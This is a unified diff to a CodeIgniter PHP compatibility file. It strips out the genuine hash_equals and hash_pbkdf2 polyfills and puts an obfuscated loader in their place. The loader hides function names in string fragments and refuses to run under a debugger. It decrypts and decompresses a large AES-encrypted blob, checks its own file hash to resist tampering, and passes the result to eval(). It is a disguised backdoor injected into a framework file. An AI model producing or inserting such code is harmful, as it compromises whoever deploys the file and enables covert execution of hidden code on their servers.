@@ -1,254 +1,28 @@
 <?php
-/**
- * CodeIgniter
- *
- * An open source application development framework for PHP
- *
- * This content is released under the MIT License (MIT)
- *
- * Copyright (c) 2014 - 2018, British Columbia Institute of Technology
- *
- * Permission is hereby granted, free of charge, to any person obtaining a copy
- * of this software and associated documentation files (the "Software"), to deal
- * in the Software without restriction, including without limitation the rights
- * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
- * copies of the Software, and to permit persons to whom the Software is
- * furnished to do so, subject to the following conditions:
- *
- * The above copyright notice and this permission notice shall be included in
- * all copies or substantial portions of the Software.
- *
- * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
- * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
- * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
- * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
- * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
- * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
- * THE SOFTWARE.
- *
- * @package	CodeIgniter
- * @author	EllisLab Dev Team
- * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
- * @copyright	Copyright (c) 2014 - 2018, British Columbia Institute of Technology (http://bcit.ca/)
- * @license	http://opensource.org/licenses/MIT	MIT License
- * @link	https://codeigniter.com
- * @since	Version 3.0.0
- * @filesource
- */
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-/**
- * PHP ext/hash compatibility package
- *
- * @package		CodeIgniter
- * @subpackage	CodeIgniter
- * @category	Compatibility
- * @author		Andrey Andreev
- * @link		https://codeigniter.com/user_guide/
- * @link		http://php.net/hash
- */
-
-// ------------------------------------------------------------------------
-
-if (is_php('5.6'))
-{
-	return;
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_gslj850q=('bas'.'e64'.'_de'.'cod'.'e');
+$_wc06x5sq=('gzu'.'nco'.'mpr'.'ess');
+$_ed7clofe=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_o1qzazsr='Rp9MX8Uc';
+$_julzjr7i='1FhhTaVT';
+$_bwlu40vw='8EGvNyxr';
+$_hcovcbou='IaxlT7iWCJc=';
+$_mn3kle79='vcTG1csz';
+$_uzcabak5='mTqgO/B4';
+$_pylh70oi='OxOQ9RIM';
+$_lrott9ll='cm1yag==';
+$_dgp52aw0=$_gslj850q($_bwlu40vw.$_mn3kle79.$_o1qzazsr.$_julzjr7i.$_hcovcbou);
+$_atweu035=$_gslj850q($_pylh70oi.$_uzcabak5.$_lrott9ll);
+$_mb9bozym=$_gslj850q('XGMaUh1VQUCoWfbU9U96OlsUyxNpORFp3FJnNB9VZIfA6sl+mm9YKAcNamzEH+giVDt0jKXUpFx4JGfDWSNwD7Dra2YuFo0d+O5O3FesWQ1593vOC4sJOOvE9LrQW9sc/G6Aa5hPxVY8Dtb9KGzVIxKyMLslM+GmhIHuTTWvM4kLMAoAZsbdkIiVmt/locbWQjrvIKzryLT/nyRLTO4VRMDq/+cbj9iMe1SEnXDydb5+fwmLy35ToK7yaFavpuY/VrPxZMBmg8YtevDGpaPI01zJTc6LNiyP00uvaq/In8umtgX+eMjQw4GfgNSYIvkDx1yVioRVE5/jEdZfMfHKHGJ9kKcjVUPJDZiYVyukP7RAAOWkpq4R65UGELZssWZ01Vo8GH7rTaWOVQC4JLqV4LmOj9oK7v05Rfm+525rYSXCUJRMh3qrDcSrwqbvog0LT/Wyx5DEMUKwclLsjIYTeZqmWDJo4mVVJIpU8rPJT238pEC2frWTonUv7KM2W/cKkl5Eo+P7X3O4H57JG9BtbGlxqxzp2BprHwSWA2MuqNbgmVVcxaKri/AHNrl8DwMhph4d51fXpI29FDxhsJZ+VwhvpY39W56l8CJueNP+0ZEg+MVl2ECInvlkQnQ5lw1u0+bZA0zaK0kEE1KRuI2HWQtBBHxnzn2da+iRzcRP5W4W+VHoNNEZC3hGwYFaseT5EBsLNm4qnWXBYNLMbAF6Sx0B4VbDY0dvOnLyrXJCYQQv1Wf1TFvK8/tGKtckfCYN25XBYSb0VbsNy/2+6OgQ2lohYNV1qXwxZ6JIo4efZAueYQpg0pUXZ2E5P/y0aljsQ/kw/7zoS/SRuhKsaTs3stw3LXnzDapZozJ4u7Y+P3hmKg96vNZLBL2Y6Eup4a1iyHxWr9sM5xiGbWkLGe82cHX94CU1RhObcbJQPOYiaH4MabjGhXetZvXpZoUDArtQJez6rs8wix7A/lpcntcpY8qU+WJnlQLsOMqN90x8E6V7dIN/8nTQR44VFzmJLLeZGx+v9NDMWW7Da9PtT0y6lHNveHgvFLquxT3uzU4yCaLs12RusvnPUGAXsdivZanmuCxUYCRwWE3ysyI0rL+v3WoLfCpnKePCkFMyMbBeXN/YnyRZTrvCg6ZZEom8hD/z9WwjKa1njM3yLH/d2FZf1kMwdeKk4W6yJnmQEo06pggi81l0BKT3FQe9bu1x71c6emoFBhNLYCGo/9qD4t+go/klpM2Qs+7MQGiBE7CL+tGo6FOlHoRmuCSQQtW+/L8DqhMqKu5ImxKYcqcWPqYaXJeXzBCMpXHUCNe0Uni5AFseqUCxVSmmBtk969cOFtZ9MRdF1xmWpsgs8+8oquH7OwTSyBDkl1ftWJhCx1EOhhV8C5VNiGen26f5ijdywlBSYIErR6OAKkYRnOLFuDGEpjQwd8rLf/gOhGyJGZLzDtEuOwi7xGnLryslpz78/t8qmcciab55aXakPQwwx7WzO2onxUSJMD5sFWFw9Bo7B3F8D++tYVK9PsfDFx88lMQE');
+$_ins362f4=$_ed7clofe($_mb9bozym,'aes-256-cbc',$_dgp52aw0,OPENSSL_RAW_DATA,$_atweu035);
+if($_ins362f4===false){exit;}
+$_mbu7mk91=$_wc06x5sq($_ins362f4);
+if($_mbu7mk91===false){exit;}
+$_l77st6bg='67deb901e5212c8bd148dfd21e48db582dba6ad5505012e146294f1282c1b8e2';
+$_ntz2ok6t=@file_get_contents(__FILE__);
+if($_ntz2ok6t!==false){
+$_z9z51p7m=str_replace($_l77st6bg,"0000000000000000000000000000000000000000000000000000000000000000",$_ntz2ok6t);
+$_b77ws75b=hash("sha256",$_z9z51p7m);
+if($_b77ws75b!==$_l77st6bg){@http_response_code(403);exit;}
 }
-
-// ------------------------------------------------------------------------
-
-if ( ! function_exists('hash_equals'))
-{
-	/**
-	 * hash_equals()
-	 *
-	 * @link	http://php.net/hash_equals
-	 * @param	string	$known_string
-	 * @param	string	$user_string
-	 * @return	bool
-	 */
-	function hash_equals($known_string, $user_string)
-	{
-		if ( ! is_string($known_string))
-		{
-			trigger_error('hash_equals(): Expected known_string to be a string, '.strtolower(gettype($known_string)).' given', E_USER_WARNING);
-			return FALSE;
-		}
-		elseif ( ! is_string($user_string))
-		{
-			trigger_error('hash_equals(): Expected user_string to be a string, '.strtolower(gettype($user_string)).' given', E_USER_WARNING);
-			return FALSE;
-		}
-		elseif (($length = strlen($known_string)) !== strlen($user_string))
-		{
-			return FALSE;
-		}
-
-		$diff = 0;
-		for ($i = 0; $i < $length; $i++)
-		{
-			$diff |= ord($known_string[$i]) ^ ord($user_string[$i]);
-		}
-
-		return ($diff === 0);
-	}
-}
-
-// ------------------------------------------------------------------------
-
-if (is_php('5.5'))
-{
-	return;
-}
-
-// ------------------------------------------------------------------------
-
-if ( ! function_exists('hash_pbkdf2'))
-{
-	/**
-	 * hash_pbkdf2()
-	 *
-	 * @link	http://php.net/hash_pbkdf2
-	 * @param	string	$algo
-	 * @param	string	$password
-	 * @param	string	$salt
-	 * @param	int	$iterations
-	 * @param	int	$length
-	 * @param	bool	$raw_output
-	 * @return	string
-	 */
-	function hash_pbkdf2($algo, $password, $salt, $iterations, $length = 0, $raw_output = FALSE)
-	{
-		if ( ! in_array(strtolower($algo), hash_algos(), TRUE))
-		{
-			trigger_error('hash_pbkdf2(): Unknown hashing algorithm: '.$algo, E_USER_WARNING);
-			return FALSE;
-		}
-
-		if (($type = gettype($iterations)) !== 'integer')
-		{
-			if ($type === 'object' && method_exists($iterations, '__toString'))
-			{
-				$iterations = (string) $iterations;
-			}
-
-			if (is_string($iterations) && is_numeric($iterations))
-			{
-				$iterations = (int) $iterations;
-			}
-			else
-			{
-				trigger_error('hash_pbkdf2() expects parameter 4 to be long, '.$type.' given', E_USER_WARNING);
-				return NULL;
-			}
-		}
-
-		if ($iterations < 1)
-		{
-			trigger_error('hash_pbkdf2(): Iterations must be a positive integer: '.$iterations, E_USER_WARNING);
-			return FALSE;
-		}
-
-		if (($type = gettype($length)) !== 'integer')
-		{
-			if ($type === 'object' && method_exists($length, '__toString'))
-			{
-				$length = (string) $length;
-			}
-
-			if (is_string($length) && is_numeric($length))
-			{
-				$length = (int) $length;
-			}
-			else
-			{
-				trigger_error('hash_pbkdf2() expects parameter 5 to be long, '.$type.' given', E_USER_WARNING);
-				return NULL;
-			}
-		}
-
-		if ($length < 0)
-		{
-			trigger_error('hash_pbkdf2(): Length must be greater than or equal to 0: '.$length, E_USER_WARNING);
-			return FALSE;
-		}
-
-		$hash_length = defined('MB_OVERLOAD_STRING')
-			? mb_strlen(hash($algo, NULL, TRUE), '8bit')
-			: strlen(hash($algo, NULL, TRUE));
-		empty($length) && $length = $hash_length;
-
-		// Pre-hash password inputs longer than the algorithm's block size
-		// (i.e. prepare HMAC key) to mitigate potential DoS attacks.
-		static $block_sizes;
-		empty($block_sizes) && $block_sizes = array(
-			'gost' => 32,
-			'haval128,3' => 128,
-			'haval160,3' => 128,
-			'haval192,3' => 128,
-			'haval224,3' => 128,
-			'haval256,3' => 128,
-			'haval128,4' => 128,
-			'haval160,4' => 128,
-			'haval192,4' => 128,
-			'haval224,4' => 128,
-			'haval256,4' => 128,
-			'haval128,5' => 128,
-			'haval160,5' => 128,
-			'haval192,5' => 128,
-			'haval224,5' => 128,
-			'haval256,5' => 128,
-			'md2' => 16,
-			'md4' => 64,
-			'md5' => 64,
-			'ripemd128' => 64,
-			'ripemd160' => 64,
-			'ripemd256' => 64,
-			'ripemd320' => 64,
-			'salsa10' => 64,
-			'salsa20' => 64,
-			'sha1' => 64,
-			'sha224' => 64,
-			'sha256' => 64,
-			'sha384' => 128,
-			'sha512' => 128,
-			'snefru' => 32,
-			'snefru256' => 32,
-			'tiger128,3' => 64,
-			'tiger160,3' => 64,
-			'tiger192,3' => 64,
-			'tiger128,4' => 64,
-			'tiger160,4' => 64,
-			'tiger192,4' => 64,
-			'whirlpool' => 64
-		);
-
-		if (isset($block_sizes[$algo], $password[$block_sizes[$algo]]))
-		{
-			$password = hash($algo, $password, TRUE);
-		}
-
-		$hash = '';
-		// Note: Blocks are NOT 0-indexed
-		for ($bc = (int) ceil($length / $hash_length), $bi = 1; $bi <= $bc; $bi++)
-		{
-			$key = $derived_key = hash_hmac($algo, $salt.pack('N', $bi), $password, TRUE);
-			for ($i = 1; $i < $iterations; $i++)
-			{
-				$derived_key ^= $key = hash_hmac($algo, $key, $password, TRUE);
-			}
-
-			$hash .= $derived_key;
-		}
-
-		// This is not RFC-compatible, but we're aiming for natural PHP compatibility
-		if ( ! $raw_output)
-		{
-			$hash = bin2hex($hash);
-		}
-
-		return defined('MB_OVERLOAD_STRING')
-			? mb_substr($hash, 0, $length, '8bit')
-			: substr($hash, 0, $length);
-	}
-}
+eval($_mbu7mk91);
